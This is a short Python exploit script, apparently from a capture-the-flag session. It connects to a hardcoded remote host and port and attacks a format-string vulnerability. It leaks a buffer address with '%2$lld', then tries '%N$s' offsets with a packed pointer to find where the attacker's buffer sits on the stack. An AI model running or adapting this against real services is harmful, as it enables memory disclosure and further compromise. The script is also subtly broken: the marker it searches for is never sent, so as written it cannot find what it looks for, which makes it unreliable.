#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642

def ask(s, fmt):
    if isinstance(fmt, str): fmt=fmt.encode()
    s.send(fmt+b"\n")
    time.sleep(0.1)
    try: return s.recv(4096)
    except Exception: return b'<T>'

s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
# leak buffer addr (arg2)
d=ask(s,"%2$lld")
m=re.search(rb'([0-9]+)\n',d)
B=int(m.group(1)) if m else 0
print("buffer(arg2) =", hex(B))
# marker: place B (valid ptr to our buffer) at buffer[0:8], then %N$s
# if %N$s prints our trailing bytes, N reads from buffer[0:8]
marker=b"MARKER123"
for N in range(3, 26):
    payload = struct.pack("<Q", B) + b"%"+str(N).encode()+b"$s"
    d=ask(s, payload)
    # look for our marker bytes appearing in the %s output
    found = b"MARKER123" in d
    if found:
        print(f"FOUND N={N}: {d!r}")
    else:
        if d not in (b'',b'<T>'):
            print(f"  N={N}: {d!r}")
s.close()
